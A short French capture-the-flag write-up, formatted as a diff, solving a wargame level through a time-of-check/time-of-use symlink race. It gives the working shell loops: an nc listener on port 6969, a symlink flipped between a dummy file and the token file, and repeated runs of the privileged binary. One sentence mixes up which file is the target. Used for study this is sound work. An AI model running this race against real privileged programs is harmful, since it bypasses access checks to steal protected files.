@@ -1,0 +1,36 @@
+Quand on fait cat level10 on observe:
+
+-  sends file to host if you have access to it
+-  Connecting to %s:6969 .. Unable to connect to host %s
+-  .*( )*.
+-  Unable to write banner to host %s
+-  Connected!
+-  Sending file .. 
+-  Damn. Unable to open fileUnable to read from file: %s
+-  wrote file!
+-  You don't have access to %s
+
+
+
+On peut comprend que quelque chose va être envoyé a un host sur le port 6969
+
+Aussi en faisant `nm level10` on voit que la fonction access est utilisée, on note également qu’il n y a pas de fonction comme stat, lstat, readpath, realpath, qui permettent de récupérer le path reel d’un lien symbolique.
+
+On peut comprendre que le fichier que l’on donne en argument est testé avec access dans un premier temps puis il est open plus tard
+(On peut s’en rendre compte avec gdb si on `disas main` la fonction access est appelee bien avant la foncion open)
+
+La mission :
+  
+	soit x, le fichier contenant le token a cracker
+	soit y, un fichier sur lequel on a les droit de lecture
+	On va creer un lien symbolique z qui va pointer en boucle de facon alternée sur x, puis sur y , puis sur x, puis y etc. . .
+	Comme ca avec de la chance on va passer le access avec z qui pointe sur x, et le temps d’arriver a open le lien symbolique z aura changer et pointera sur y donc le fichier que lon cherche a lire.
+
+Solution:
+  On ouvre trois shells (avec ssh toussa),
+    dans le premier : `while true; do nc -l 6969 ; done`
+	`echo "wesh alors" > /tmp/coucou`
+    dans le deuxieme : `while true; do ln -fs /tmp/coucou /tmp/link; ln -fs ~/token /tmp/link; done`
+    dans le troisieme : `while true; do ./level10 /tmp/link 127.0.0.1; done`
+
+	et paf dans le premier shell on va avoir le mdp de flag10 qui va s’afficher plein de fois.
